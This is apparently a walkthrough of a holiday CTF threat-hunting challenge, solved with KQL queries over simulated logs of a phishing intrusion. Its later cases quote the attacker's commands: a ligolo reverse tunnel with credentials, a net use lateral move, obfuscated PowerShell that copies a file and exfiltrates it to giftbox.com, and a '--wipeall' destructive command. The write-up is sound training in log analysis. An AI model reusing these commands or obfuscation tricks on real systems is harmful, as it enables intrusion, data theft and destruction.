# OBJECTIVE 13 - KQL Kraken Hunt #

## OBJECTIVE : ##
>Use Azure Data Explorer to [uncover misdeeds](https://detective.kusto.io/sans2023) in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information 
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 13</summary>
  
>-	Do you need to find something that happened via a process? Pay attention to the *ProcessEvents* table!
>-	Once you get into the [Kusto trainer](https://detective.kusto.io/sans2023), click the blue *Train me for the case* button to get familiar with KQL.
>-	Looking for a file that was created on a victim system? Don't forget the *FileCreationEvents* table.
</details>

#  

## PROCEDURE : ##

For this challenge we are taken to Microsoft’s Kusto detective Agency.

### ONBOARDING:### 
We are instructed to create a free Kusto Cluster and undergo a quick on-boarding trial by determining the number of Craftperson Elfs that are working from Laptops.   We can get this answer by running the following query:
```
Employees
| where role =~ "Craftsperson Elf"
| where hostname has "LAPTOP"
| distinct hostname
| count
```
**`  >25`**

Having successfully completed the onboarding session, we are entrusted with our first Case.

### CASE 1: ###
To complete this case, we need to determine three things:
>-	What is the email address of the employee who received the phishing email?
>-	What is the email address that was used to send this spear phishing email?
>-	What was the subject line used in the spear phishing email?

Since we know that the phishing email contained the URL `http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx` we can use this to filter for emails in the `Email` table and determine the recipient, sender and subject line for the email:
```
Email
| where link has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| distinct recipient, sender, subject, link
```
**`  > alabaster_snowball@santaworkshopgeeseislands.org cwombley@gmail.com [EXTERNAL] Invoice foir reindeer food past due  http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx`**

### CASE 2: ###
Now on to the second case.  For this case we are tasked with answering the following questions:
>-	What is the role of our victim in the organization?
>-	What is the hostname of the victim’s machine?
>-	What is the source IP linked to the victim?
  
Just like the previous case, we can answer all three questions in a single, simple query to the Employees table filtering by the email address obtained in CASE 1.
```
Employees
| where email_addr =~ "alabaster_snowball@santaworkshopgeeseislands.org"
| distinct role, hostname, ip_addr
```
**`  > Head Elf    Y1US-DESKTOP     10.10.0.4`**

### CASE 3: ###
For our 3rd case we need to determine the following:
>-	What time did Alabaster click on the malicious link?
>-	What file is dropped to Alabaster’s machine shortly after he downloads the malicious file?
  
To get our answer to the first question we can filter out the `OutboundEvents` table by the URL for the malicious link.  Once we have the timestamp we can then look into the `FileCreationEvents` table and filter out a couple of minutes after the timestamp we just obtained – since we expect the file to be created within a few minutes of accessing the URL.
Sure enough, we can see that just after the malicious `MonthlyInvoiceForReindeerFood.docx` a suspicious executable called **`giftwrap.exe`** was also created.

```
OutboundNetworkEvents
|where url has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| distinct timestamp
```
**`  > 2023-12-02T10:12:42Z`**
```
FileCreationEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp between (datetime(2023-12-02 10:12)..datetime(2023-12-02 10:15))
| distinct filename
```
**`  > MonthlyInvoiceForReindeerFood.docx`**

**`  > giftwrap.exe`**

### CASE 4: ###
We’re now starting to build a clear picture of what happened.  Alabaster Snowball received an email claiming to be an invoice for reindeer food.  He unwittingly downloaded the attached .docx file and opened it.  The .docx file must have had some built in Macros that instructed it to download a program called giftwrap.exe to alabaster’s machine.  In this 4th Case we are asked to determine what happened after this:
-	The attacker created a reverse tunnel connection with the compromised machine.  What IP was the connection forwarded to?
-	What is the timestamp when the attackers enumerated network shares on the machine?
-	What was the hostname of the system that attacker moved laterally to?
This case is a bit more involved than the previous one, but we can tackle it by having a close look at the ProcessEvents table and filtering for events that happened on Alabaster’s machine after clicking on the malicious link.
We can immediately notice several cmd.exe commands that have been passed to it.  Including a command for Ligolo which is a lightweight tool to create site-to-site tunnels.  In this case a reverse tunnel connection has been created to 113.37.9.17:22.

ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp between (datetime(2023-12-02 10:12)..datetime(2023-12-02 23:59) )
| where process_commandline has "ligolo"
| distinct process_commandline 
	> "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
Once the reverse tunnel has been created the intruder started looking around the system and we can see he runs the net share command to enumerate the available shares on the domain.
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where process_commandline has "net share"
|distinct process_commandline, timestamp
	> net share	2023-12-02T16:51:44Z
Finally, he pivots to the fileshare NorthPolefileshare using the net use command in cmd.exe.  
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where process_commandline has "net use"
|distinct process_commandline
	> net use
	> cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123

CASE 5:
Now it’s time for us to delve deeper into this case.  We are asked to determine the following:
-	When was the attacker’s first base64 encoded PowerShell command executed on Alabaster’s machine?
-	What was the name of the file the attacker copied from the files hare?
-	The attacker has likely exfiltrated data from the file share.  What domain name was the data exfiltrated to?
To start tackling this case we first need to see what encoded PowerShell commands we can find in the ProcessEvents table.  We can find this by filtering for process_commandline entries that include the -enc switch (which is used to pass on an encoded command).  It helps to summarize by distinct process_commandline entries here.
From the output of this query, we can determine that there is a PowerShell command that is being run on several different machines.  If we decode this command from base 64 we get the following:
print base64_decode_tostring('SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs')
> Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null
This looks like a legitimate command, and we can exclude it from our filter.
This leaves us with three encoded PowerShell commands.  All three of which were run only once and on Alabaster’s machine:
ProcessEvents
| where process_commandline  has "-enc"
| where process_commandline !has "SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs"
| distinct timestamp 
| sort by timestamp asc 
	> 2023-12-24T16:07:47Z
	> 2023-12-24T16:58:43Z
	> 2023-12-25T10:44:27Z

At this point it makes sense to copy all three base64 encoded commands and decode them to text.  I used Cyberchef for this step.
This gives us these three commands that were executed in order:
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join 

''[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2]-joiN

C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
This is interesting.  Apart from encoding his commands in base64, the attacker also used code obfuscation techniques – presumably in a bid to stop us from finding these commands by running simple searches in our log files.
The first command is written in reverse with some code at the end to sort it back in order.
Which gives us the answer to our second question:
 'powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt' 
The obfuscation of the second command is a bit craftier by using ASCII references to encode the command.  But we can decode this quite easily by passing the whole thing to a variable in PowerShell and looking at the result and finding the domain the file was exfiltrated to:
PS > $text = [StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))

PS > $text
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file

CASE 6:
For our final Case we need to gather two last bits of information:
-	What is the name of the executable the attackers used in the final malicious command?
-	What was the command line flag used alongside this executable?
These are both easy questions to answer now, since we’ve already decoded the command in Case 5 and there is no code obfuscation used for this command:
C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$ 


